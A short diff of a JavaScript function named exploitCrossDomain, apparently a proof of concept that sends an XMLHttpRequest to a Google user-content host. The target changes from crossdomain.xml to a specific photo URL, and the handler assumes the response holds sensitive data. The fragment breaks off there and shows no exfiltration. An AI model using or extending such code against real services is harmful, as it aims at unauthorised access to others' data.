@@ -8,7 +8,7 @@
         // Function to simulate a request to the vulnerable domain
         function exploitCrossDomain() {
             var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://photos.fife.usercontent.google.com/crossdomain.xml', true);
+            xhr.open('GET', 'https://photos.fife.usercontent.google.com/pw/AP1GczMm5yOaK_8BUXcdtuSVYFHF5v3s5MG3ySDAvHUpHs6bqeWr39dtJ_FLyg=s250-k-no', true);
             xhr.onload = function() {
                 if (xhr.status >= 200 && xhr.status < 300) {
                     // Assume the response contains sensitive data
